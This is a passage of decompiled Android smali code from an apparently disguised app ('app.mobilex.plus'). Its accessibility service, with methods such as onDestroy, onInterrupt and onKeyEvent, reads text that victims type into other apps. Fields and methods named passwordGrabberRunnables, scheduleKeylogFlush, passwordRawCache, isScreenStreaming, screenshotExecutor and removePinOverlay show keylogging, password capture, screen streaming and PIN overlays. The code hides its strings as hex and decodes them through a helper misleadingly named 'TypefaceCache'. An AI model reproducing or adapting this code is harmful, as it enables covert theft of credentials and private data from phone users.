    .line 2458
    move-object v8, v6

    .line 2459
    move-object v6, v3

    .line 2460
    move-object v3, v15

    .line 2461
    invoke-direct/range {v0 .. v8}, Lv/s/L8v8JsDYe1FVETypxqrQ;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;)V

    .line 2462
    .line 2463
    .line 2464
    move-object v15, v3

    nop

    .line 2465
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordGrabberRunnables:Ljava/util/HashMap;

    .line 2466
    .line 2467
    invoke-interface {v3, v2, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2468
    .line 2469
    .line 2470
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 2471
    .line 2472
    iget-wide v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->PASSWORD_GRABBER_DELAY_MS:J

    .line 2473
    .line 2474
    invoke-virtual {v3, v0, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 2475
    .line 2476
    .line 2477
    goto :goto_31

    .line 2478
    :cond_5c
    move-object v15, v0

    .line 2479
    move-object/from16 v17, v3

    .line 2480
    .line 2481
    move-object v7, v8

    .line 2482
    move-object/from16 v6, v13

    .line 2483
    move-object v3, v14

    .line 2484
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 2485
    .line 2486
    .line 2487
    move-result-object v14

    .line 2488
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 2489
    .line 2490
    .line 2491
    move-result v0

    .line 2492
    if-nez v0, :cond_5d

    .line 2493
    .line 2494
    move-object/from16 v16, v17

    .line 2495
    .line 2496
    goto :goto_30

    .line 2497
    :cond_5d
    move-object/from16 v16, v4

    .line 2498
    .line 2499
    :goto_30
    iget-object v0, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2500
    .line 2501
    move-object/from16 v20, v0

    .line 2502
    .line 2503
    check-cast v20, Ljava/lang/String;

    .line 2504
    .line 2505
    iget-object v3, v7, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2506
    .line 2507
    move-object/from16 v21, v3

    .line 2508
    .line 2509
    check-cast v21, Ljava/lang/String;

    .line 2510
    .line 2511
    iget-object v4, v6, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2512
    .line 2513
    move-object/from16 v22, v4

    .line 2514
    .line 2515
    check-cast v22, Ljava/lang/String;

    .line 2516
    .line 2517
    new-instance v13, Lv/s/NxAMaDFbSCxW6M03f;

    .line 2518
    .line 2519
    invoke-direct/range {v13 .. v23}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 2520
    .line 2521
    .line 2522
    move-object v5, v0

    .line 2523
    check-cast v5, Ljava/lang/String;

    .line 2524
    .line 2525
    move-object v6, v3

    .line 2526
    check-cast v6, Ljava/lang/String;

    .line 2527
    .line 2528
    move-object v3, v13

    nop

    nop

    .line 2529
    move-object v4, v15

    .line 2530
    move/from16 v7, v23

    .line 2531
    .line 2532
    invoke-direct/range {v1 .. v7}, Lapp/mobilex/plus/services/DataQFAdapter;->scheduleKeylogFlush(Ljava/lang/String;Lv/s/NxAMaDFbSCxW6M03f;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 2533
    .line 2534
    .line 2535
    move-object v15, v4

    .line 2536
    goto/16 :goto_31

    .line 2537
    :cond_5e
    move-object v15, v0

    .line 2538
    :goto_31
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 2539
    .line 2540
    invoke-interface {v0, v2, v15}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2541
    .line 2542
    .line 2543
    invoke-static/range {v18 .. v19}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 2544
    .line 2545
    .line 2546
    move-result-object v0

    .line 2547
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTimeCache:Ljava/util/HashMap;

    .line 2548
    .line 2549
    invoke-interface {v3, v2, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2550
    .line 2551
    .line 2552
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 2553
    .line 2554
    invoke-virtual {v0}, Ljava/util/HashMap;->size()I

    .line 2555
    .line 2556
    .line 2557
    move-result v0

    .line 2558
    const/16 v2, 0x32

    .line 2559
    .line 2560
    if-le v0, v2, :cond_64

    .line 2561
    .line 2562
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTimeCache:Ljava/util/HashMap;

    .line 2563
    .line 2564
    invoke-virtual {v0}, Ljava/util/HashMap;->entrySet()Ljava/util/Set;

    .line 2565
    .line 2566
    .line 2567
    move-result-object v0

    .line 2568
    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 2569
    .line 2570
    .line 2571
    move-result-object v0

    .line 2572
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 2573
    .line 2574
    .line 2575
    move-result v2

    .line 2576
    if-nez v2, :cond_5f

    .line 2577
    .line 2578
    const/16 v18, 0x0

    .line 2579
    .line 2580
    goto :goto_32

    .line 2581
    :cond_5f
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 2582
    .line 2583
    .line 2584
    move-result-object v18

    .line 2585
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 2586
    .line 2587
    .line 2588
    move-result v2

    .line 2589
    if-nez v2, :cond_60

    .line 2590
    .line 2591
    goto/16 :goto_32

    .line 2592
    :cond_60
    move-object/from16 v2, v18

    .line 2593
    .line 2594
    check-cast v2, Ljava/util/Map$Entry;

    .line 2595
    .line 2596
    invoke-interface {v2}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    .line 2597
    .line 2598
    .line 2599
    move-result-object v2

    .line 2600
    check-cast v2, Ljava/lang/Number;

    .line 2601
    .line 2602
    invoke-virtual {v2}, Ljava/lang/Number;->longValue()J

    .line 2603
    .line 2604
    .line 2605
    move-result-wide v2

    .line 2606
    :cond_61
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 2607
    .line 2608
    .line 2609
    move-result-object v4

    .line 2610
    move-object/from16 v5, v4

    .line 2611
    check-cast v5, Ljava/util/Map$Entry;

    .line 2612
    .line 2613
    invoke-interface {v5}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    .line 2614
    .line 2615
    .line 2616
    move-result-object v5

    .line 2617
    check-cast v5, Ljava/lang/Number;

    .line 2618
    .line 2619
    invoke-virtual {v5}, Ljava/lang/Number;->longValue()J

    .line 2620
    .line 2621
    .line 2622
    move-result-wide v5

    .line 2623
    cmp-long v7, v2, v5

    .line 2624
    .line 2625
    if-lez v7, :cond_62

    .line 2626
    .line 2627
    move-object/from16 v18, v4

    .line 2628
    .line 2629
    move-wide v2, v5

    nop

    nop

    .line 2630
    :cond_62
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 2631
    .line 2632
    .line 2633
    move-result v4

    .line 2634
    if-nez v4, :cond_61

    .line 2635
    .line 2636
    :goto_32
    check-cast v18, Ljava/util/Map$Entry;

    .line 2637
    .line 2638
    if-eqz v18, :cond_63

    .line 2639
    .line 2640
    invoke-interface/range {v18 .. v18}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    .line 2641
    .line 2642
    .line 2643
    move-result-object v0

    .line 2644
    move-object/from16 v18, v0

    .line 2645
    .line 2646
    check-cast v18, Ljava/lang/String;

    .line 2647
    .line 2648
    move-object/from16 v0, v18

    .line 2649
    .line 2650
    goto :goto_33

    .line 2651
    :cond_63
    const/4 v0, 0x0

    .line 2652
    :goto_33
    if-eqz v0, :cond_64

    .line 2653
    .line 2654
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 2655
    .line 2656
    invoke-virtual {v2, v0}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2657
    .line 2658
    .line 2659
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTimeCache:Ljava/util/HashMap;

    .line 2660
    .line 2661
    invoke-virtual {v2, v0}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2662
    .line 2663
    .line 2664
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordBuffers:Ljava/util/HashMap;

    .line 2665
    .line 2666
    invoke-virtual {v2, v0}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2667
    .line 2668
    .line 2669
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordRawCache:Ljava/util/HashMap;

    .line 2670
    .line 2671
    invoke-virtual {v2, v0}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2672
    .line 2673
    .line 2674
    :cond_64
    iput-object v15, v1, Lapp/mobilex/plus/services/DataQFAdapter;->lastText:Ljava/lang/String;

    .line 2675
    .line 2676
    :cond_65
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 2677
    .line 2678
    .line 2679
    move-result v0

    .line 2680
    const v2, 0x8

    .line 2681
    .line 2682
    if-ne v0, v2, :cond_6f

    nop

    .line 2683
    .line 2684
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->isScreenStreaming:Z
    :try_end_1c
    .catchall {:try_start_1c .. :try_end_1c} :catchall_1

    .line 2685
    .line 2686
    if-nez v0, :cond_6f

    .line 2687
    .line 2688
    :try_start_1d
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 2689
    .line 2690
    .line 2691
    move-result-object v14
    :try_end_1d
    .catchall {:try_start_1d .. :try_end_1d} :catchall_e

    .line 2692
    if-eqz v14, :cond_66

    .line 2693
    .line 2694
    :try_start_1e
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    .line 2695
    .line 2696
    .line 2697
    move-result v0

    .line 2698
    if-eqz v0, :cond_66

    .line 2699
    .line 2700
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    .line 2701
    .line 2702
    .line 2703
    move-result v0

    .line 2704
    if-nez v0, :cond_66

    .line 2705
    .line 2706
    iget-boolean v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollActive:Z

    nop

    nop

    .line 2707
    .line 2708
    if-eqz v0, :cond_66

    .line 2709
    .line 2710
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->stopPwdPoll()V

    .line 2711
    .line 2712
    .line 2713
    goto :goto_34

    .line 2714
    :catchall_d
    move-exception v0

    .line 2715
    goto/16 :goto_3a

    .line 2716
    .line 2717
    :cond_66
    :goto_34
    if-eqz v14, :cond_6d

    .line 2718
    .line 2719
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    .line 2720
    .line 2721
    .line 2722
    move-result v0

    .line 2723
    if-eqz v0, :cond_6d

    .line 2724
    .line 2725
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 2726
    .line 2727
    .line 2728
    move-result-object v0

    .line 2729
    if-eqz v0, :cond_68

    .line 2730
    .line 2731
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 2732
    .line 2733
    .line 2734
    move-result-object v0

    .line 2735
    if-nez v0, :cond_67

    .line 2736
    .line 2737
    goto/16 :goto_35

    nop

    .line 2738
    :cond_67
    move-object/from16 v4, v0

    .line 2739
    goto :goto_36

    .line 2740
    :cond_68
    :goto_35
    move-object/from16 v4, v12

    .line 2741
    :goto_36
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    .line 2742
    .line 2743
    .line 2744
    move-result-object v0

    .line 2745
    if-nez v0, :cond_69

    .line 2746
    .line 2747
    move-object v11, v12

    .line 2748
    goto :goto_37

    .line 2749
    :cond_69
    move-object/from16 v11, v0

    .line 2750
    :goto_37
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 2751
    .line 2752
    new-instance v2, Ljava/lang/StringBuilder;

    .line 2753
    .line 2754
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 2755
    .line 2756
    .line 2757
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2758
    .line 2759
    .line 2760
    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2761
    .line 2762
    .line 2763
    invoke-virtual {v2, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2764
    .line 2765
    .line 2766
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 2767
    .line 2768
    .line 2769
    move-result-object v0

    .line 2770
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 2771
    .line 2772
    invoke-virtual {v2, v0}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2773
    .line 2774
    .line 2775
    move-result-object v2

    .line 2776
    check-cast v2, Ljava/lang/String;

    .line 2777
    .line 2778
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 2779
    .line 2780
    .line 2781
    move-result v3

    .line 2782
    if-lez v3, :cond_6d

    .line 2783
    .line 2784
    invoke-static {v4, v2}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 2785
    .line 2786
    .line 2787
    move-result v2

    .line 2788
    if-nez v2, :cond_6d

    .line 2789
    .line 2790
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    .line 2791
    .line 2792
    .line 2793
    move-result-object v2

    .line 2794
    if-eqz v2, :cond_6b

    .line 2795
    .line 2796
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 2797
    .line 2798
    .line 2799
    move-result-object v2

    .line 2800
    if-nez v2, :cond_6a

    .line 2801
    .line 2802
    goto :goto_38

    .line 2803
    :cond_6a
    move-object/from16 v10, v2

    .line 2804
    goto/16 :goto_39

    nop

    .line 2805
    :cond_6b
    :goto_38
    move-object/from16 v10, v12

    nop

    nop

    .line 2806
    :goto_39
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    .line 2807
    .line 2808
    .line 2809
    move-result v12

    .line 2810
    invoke-direct {v1, v14, v12}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveFieldType(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Ljava/lang/String;

    .line 2811
    .line 2812
    .line 2813
    move-result-object v9

    .line 2814
    const-string v2, "0025007F005E008B00F4008000D100A8002D0062005E008900E4"

    .line 2815
    .line 2816
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 2817
    .line 2818
    .line 2819
    move-result-object v3

    .line 2820
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 2821
    .line 2822
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    .line 2823
    .line 2824
    .line 2825
    move-result v5

    .line 2826
    if-nez v5, :cond_6c

    .line 2827
    .line 2828
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 2829
    .line 2830
    :cond_6c
    move-object v5, v2

    .line 2831
    iget-object v6, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 2832
    .line 2833
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 2834
    .line 2835
    .line 2836
    move-result-wide v7

    .line 2837
    new-instance v2, Lv/s/NxAMaDFbSCxW6M03f;

    .line 2838
    .line 2839
    invoke-direct/range {v2 .. v12}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 2840
    .line 2841
    .line 2842
    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2843
    .line 2844
    invoke-virtual {v3, v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 2845
    .line 2846
    .line 2847
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 2848
    .line 2849
    invoke-interface {v2, v0, v4}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1e
    .catchall {:try_start_1e .. :try_end_1e} :catchall_d

    .line 2850
    .line 2851
    .line 2852
    :cond_6d
    if-eqz v14, :cond_6f

    .line 2853
    .line 2854
    :try_start_1f
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1f
    .catchall {:try_start_1f .. :try_end_1f} :catchall_10

    .line 2855
    .line 2856
    .line 2857
    goto :goto_3c

    .line 2858
    :catchall_e
    move-exception v0

    .line 2859
    const/4 v14, 0x0

    .line 2860
    :goto_3a
    if-eqz v14, :cond_6e

    nop

    nop

    .line 2861
    .line 2862
    :try_start_20
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_20
    .catchall {:try_start_20 .. :try_end_20} :catchall_f

    .line 2863
    .line 2864
    .line 2865
    :catchall_f
    :cond_6e
    :try_start_21
    throw v0
    :try_end_21
    .catchall {:try_start_21 .. :try_end_21} :catchall_1

    .line 2866
    :goto_3b
    const-string v2, "002C0078007A008400F300BA00C100B4002A00740052008B00F900AB00CB0082003500730055009300B000BA00C000B5002C0064000100C7"

    .line 2867
    .line 2868
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 2869
    .line 2870
    .line 2871
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 2872
    .line 2873
    .line 2874
    :catchall_10
    :cond_6f
    :goto_3c
    return-void
.end method

.method public onDestroy()V
    .locals 5

    .line 1
    const-string v0, "00150058007800C700D100BC00D100A2003000650052008500F900B300DB00B3003A00360068008200E200A900DB00A4002600360054008900D400BA00C100B300310079004200C700F300BE00DE00AB00260072001A"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    const/16 v0, 0x0

    .line 7
    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->_guardPollRunning:Z

    .line 8
    .line 9
    :try_start_0
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->removePinOverlay()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 10
    .line 11
    .line 12
    :catchall_0
    const/4 v0, 0x0

    .line 13
    :try_start_1
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 14
    .line 15
    invoke-virtual {v1, v0}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 16
    .line 17
    .line 18
    :catchall_1
    :try_start_2
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 19
    .line 20
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 21
    .line 22
    .line 23
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->dQC4QhgRN3MSEAP3HW0()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 24
    .line 25
    .line 26
    :catchall_2
    :try_start_3
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 27
    .line 28
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 29
    .line 30
    .line 31
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getBatchTimer$cp()Ljava/util/concurrent/ScheduledExecutorService;

    .line 32
    .line 33
    .line 34
    move-result-object v1

    .line 35
    if-eqz v1, :cond_0

    .line 36
    .line 37
    invoke-interface {v1}, Ljava/util/concurrent/ExecutorService;->shutdownNow()Ljava/util/List;

    .line 38
    .line 39
    .line 40
    :cond_0
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setBatchTimer$cp(Ljava/util/concurrent/ScheduledExecutorService;)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_3

    .line 41
    .line 42
    .line 43
    :catchall_3
    :try_start_4
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->removeClipboardListener()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_4

    .line 44
    .line 45
    .line 46
    :catchall_4
    :try_start_5
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 47
    .line 48
    sget-boolean v1, Lv/s/vbdyByOHPJmeGXlq;->xfn2GJwmGqs7kWW:Z

    nop

    .line 49
    .line 50
    if-eqz v1, :cond_1

    .line 51
    .line 52
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->gmNWMfvn6zlEj()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_5

    .line 53
    .line 54
    .line 55
    :catchall_5
    :cond_1
    :try_start_6
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 56
    .line 57
    sget-boolean v1, Lv/s/vbdyByOHPJmeGXlq;->b1EoSIRjJHO5:Z

    .line 58
    .line 59
    if-eqz v1, :cond_2

    .line 60
    .line 61
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->hjneShqpF9Tis4()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_6

    .line 62
    .line 63
    .line 64
    :catchall_6
    :cond_2
    :try_start_7
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->lockedApps:Ljava/util/Set;

    .line 65
    .line 66
    invoke-interface {v1}, Ljava/util/Set;->clear()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_7

    .line 67
    .line 68
    .line 69
    :catchall_7
    :try_start_8
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->blockedApps:Ljava/util/Set;

    .line 70
    .line 71
    invoke-interface {v1}, Ljava/util/Set;->clear()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_8

    .line 72
    .line 73
    .line 74
    :catchall_8
    :try_start_9
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->autoLockedApps:Ljava/util/Set;

    nop

    .line 75
    .line 76
    invoke-interface {v1}, Ljava/util/Set;->clear()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_9

    .line 77
    .line 78
    .line 79
    :catchall_9
    :try_start_a
    sget-object v1, Lv/s/RWY6BVSB0XxPbw;->d6c98qX7r0XzUZFibx:Lv/s/iStgVlW5d7CQ5MhFi;

    .line 80
    .line 81
    sget-object v1, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;

    .line 82
    .line 83
    if-eqz v1, :cond_3

    .line 84
    .line 85
    new-instance v2, Lorg/json/JSONObject;

    .line 86
    .line 87
    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 88
    .line 89
    .line 90
    const-string v3, "0037006F004B0082"

    .line 91
    .line 92
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 93
    .line 94
    .line 95
    move-result-object v3

    .line 96
    const-string v4, "002200750058008200E300AC00DB00A5002A007A0052009300E9008000C700A900220060005A008E00FC00BE00D000AB0026"

    .line 97
    .line 98
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 99
    .line 100
    .line 101
    move-result-object v4

    .line 102
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 103
    .line 104
    .line 105
    const-string v3, "00310073005A009400FF00B1"

    .line 106
    .line 107
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 108
    .line 109
    .line 110
    move-result-object v3

    .line 111
    const-string v4, "003000730049009100F900BC00D70098002700730048009300E200B000CB00A20027"

    .line 112
    .line 113
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 114
    .line 115
    .line 116
    move-result-object v4

    nop

    .line 117
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 118
    .line 119
    .line 120
    invoke-virtual {v1, v2}, Lv/s/RWY6BVSB0XxPbw;->H9XlUr4OeMJFiXK(Lorg/json/JSONObject;)V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_a

    .line 121
    .line 122
    .line 123
    :catchall_a
    :cond_3
    :try_start_b
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->screenshotExecutor:Ljava/util/concurrent/ExecutorService;

    .line 124
    .line 125
    invoke-interface {v1}, Ljava/util/concurrent/ExecutorService;->shutdownNow()Ljava/util/List;
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_b

    .line 126
    .line 127
    .line 128
    :catchall_b
    :try_start_c
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->appNameCache:Ljava/util/concurrent/ConcurrentHashMap;

    .line 129
    .line 130
    invoke-virtual {v1}, Ljava/util/concurrent/ConcurrentHashMap;->clear()V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_c

    .line 131
    .line 132
    .line 133
    :catchall_c
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 134
    .line 135
    .line 136
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->instance:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 137
    .line 138
    const-string v0, "00150058007800C700D100BC00D100A2003000650052008500F900B300DB00B3003A00360068008200E200A900DB00A400260036005F008200E300AB00C000A8003A0073005F"

    .line 139
    .line 140
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 141
    .line 142
    .line 143
    return-void
.end method

.method public onInterrupt()V
    .locals 1

    .line 1
    const-string v0, "00150058007800C700D100BC00D100A2003000650052008500F900B300DB00B3003A00360068008200E200A900DB00A4002600360052008900E400BA00C000B500360066004F008200F4"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method public onKeyEvent(Landroid/view/KeyEvent;)Z
    .locals 17

    .line 1
    move-object/from16 v1, p0

    nop

    .line 2
    .line 3
    const-string v0, "002B00610064008C00F500A6"

    .line 4
    .line 5
    const/16 v2, 0x0

    .line 6
    :try_start_0
    sget-object v3, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 7
    .line 8
    sget-boolean v3, Lv/s/vbdyByOHPJmeGXlq;->b1EoSIRjJHO5:Z

    .line 9
    .line 10
    const/4 v4, 0x1

    .line 11
    if-eqz v3, :cond_1

    .line 12
    .line 13
    sget-object v3, Lv/s/vbdyByOHPJmeGXlq;->pyu8ovAipBTLYAiKab:Ljava/lang/String;

    nop

    .line 14
    .line 15
    sget-object v5, Lv/s/vbdyByOHPJmeGXlq;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 16
    .line 17
    invoke-static {v3, v5}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

